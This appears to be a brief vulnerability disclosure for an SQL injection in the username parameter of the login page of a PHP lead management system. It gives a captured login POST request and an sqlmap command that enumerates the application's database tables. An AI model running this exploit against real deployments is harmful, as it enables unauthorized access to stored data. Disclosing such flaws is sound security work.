vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/15933/lead-management-system-php-open-source-free-download.html

Vulnerability trigger parameter: $username

The process of vulnerability discovery is as follows：

![image](https://user-images.githubusercontent.com/30823782/208321663-6b1fc949-eed0-4a49-9f2b-0cd6e9c61920.png)


sqlmap.txt:

```
POST /penglead/login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Referer: http://192.168.152.128/penglead/login.php
Cookie: PHPSESSID=m6ttpu8qbr1raki0mnj605hpj4
Content-Length: 90
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.0 Safari/537.36
Host: 192.168.152.128
Connection: Keep-alive

login=&password=123&username=123
```

EXP:

```
sqlmap.py -r sqlmap.txt -p username --dbms=mysql -D penglead --tables
```
![image](https://user-images.githubusercontent.com/30823782/208321678-a380010e-90fc-43fc-bc40-24139c8c1ce5.png)


